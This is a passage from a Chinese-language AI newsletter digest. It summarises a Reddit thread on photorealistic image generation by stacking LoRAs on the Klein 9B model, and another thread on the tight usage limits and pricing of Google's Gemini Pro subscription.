  - **[Extreme realism with Klein 9B distilled 2 loras together](https://www.reddit.com/r/StableDiffusion/comments/1tiwruj/extreme_realism_with_klein_9b_distilled_2_loras/)**（热度：1716）：**该帖子声称，通过叠加多个 LoRA，**Klein 9B Distilled / Flux2 Klein Base 9B** 能够实现异常出色的照片级真实感：[`Better Skin Concept 2.0`](https://civitai.red/models/2613362/flux2-klein-base-9b-better-skin-concept?modelVersionId=2946217) + [`Smartphone Snapshot Photo Reality v13.0 OMEGA`](https://civitai.red/models/2381927/flux2-klein-base-9b-smartphone-snapshot-photo-reality-style?modelVersionId=2916530)，还可以选择与 **SNof 1.3** 组合使用。作者表示，所有样例都是纯**文生图**，**没有进行编辑或放大**，并且是在 **RTX 3060 Ti 8GB** 上生成的。作者还认为，Klein 可以在每个 LoRA 权重均为 `1.0` 的情况下同时运行 `3` 个 LoRA，画面质量不会下降；相比之下，他们声称 **Z Image Turbo** 在使用超过 `2` 个 LoRA，或权重高于约 `1.4` 时，就容易出现问题。**评论者大多是在表达对其真实感的反应，其中一人表示，有些图片让自己怀疑它们是否真的是 AI 生成的；另一条回复似乎持怀疑或批评态度，但没有补充技术细节。



### 3. 付费 AI 套餐的使用限制

  - **[8 minutes of chatting with Pro and I'm at 100% usage with this new update. Is this a joke? Pro subscription btw](https://www.reddit.com/r/GeminiAI/comments/1thplt8/8_minutes_of_chatting_with_pro_and_im_at_100/)**（热度：1980）：**一张 Google Gemini Pro“Usage limits”页面的手机截图显示，用户聊天约 8 分钟后，当前限制已经达到 `100%`；但页面上另一个每周限额却只显示使用了 `5%`。同时，页面还推广一个声称拥有**“20x more usage than AI Pro”** 的更高档套餐，价格为 `$409.99/month`（[图片](https://i.redd.it/yu7lv06pz32h1.jpeg)）。从技术角度看，这个帖子体现了消费级 LLM 产品中越来越细化、也越来越不透明的配额管理方式；这可能意味着限制是按模型、时间窗口或计算成本实施的，而不再只是简单的每周消息数量上限。**评论者认为，这是 Google 正在采用类似 Anthropic 的严格限制；他们担心，随着服务提供商试图收回推理成本，付费 AI 订阅正在受到越来越严格的计量。几位评论者对 **Google** 似乎也会受到计算资源限制，或会把用户引导至价格极高的高用量套餐感到意外，毕竟 Google 拥有庞大的基础设施规模。

    - 用户报告称，**Gemini Pro** 的配额大幅缩减：有人声称聊天仅 `8 minutes` 就达到 `100%` 使用量，另有人称触发了**每周限额**。该讨论将其视为一种转变：即使用户已经付费，消费级 AI 也从较为宽松的访问模式转向了更严格的计算资源配给。
    - 几条评论将这些新限制解读为证据，认为即便是 **Google** 也把 frontier-model 推理视为计算资源受限的问题，用户还将其与 Anthropic 式的使用上限进行比较。一位评论者特别批评 **Flash Lite** 是能力缩水的备用模型，这意味着配额系统可能会让付费用户更频繁地被切换到能力较低的模型。
    - 定价是影响技术访问的一个主要问题：用户将每月约 `$6.99` 的低价 **Pro** 订阅，与帖子提到的每月 `$409.99` 的更高档 AI 价格进行对比，认为高级模型的访问权正变成一种由经济能力决定的门槛，而不是面向大众广泛提供的服务。




# AI Discord 社区

很遗憾，Discord 今天关闭了我们的访问权限。我们不会以这种形式恢复它，但很快会推出新版 AINews。感谢你读到这里，这段经历曾经很美好。